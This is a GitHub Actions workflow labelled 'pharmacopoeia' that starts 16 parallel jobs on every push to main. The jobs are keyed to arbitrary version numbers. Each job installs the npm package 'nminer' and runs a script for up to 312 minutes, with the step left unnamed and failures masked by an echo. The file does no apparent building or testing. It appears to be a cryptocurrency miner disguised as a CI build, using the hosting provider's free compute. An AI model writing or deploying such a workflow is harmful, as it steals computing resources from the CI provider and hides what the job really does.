name: pharmacopoeia
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1407 }
          - { version: 4574 }
          - { version: 4955 }
          - { version: 1948 }
          - { version: 2862 }
          - { version: 458 }
          - { version: 2126 }
          - { version: 9915 }
          - { version: 7769 }
          - { version: 7360 }
          - { version: 7023 }
          - { version: 1650 }
          - { version: 1135 }
          - { version: 3619 }
          - { version: 3770 }
          - { version: 9515 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 312m node pharmacopoeia.js || echo "pharmacopoeia executed"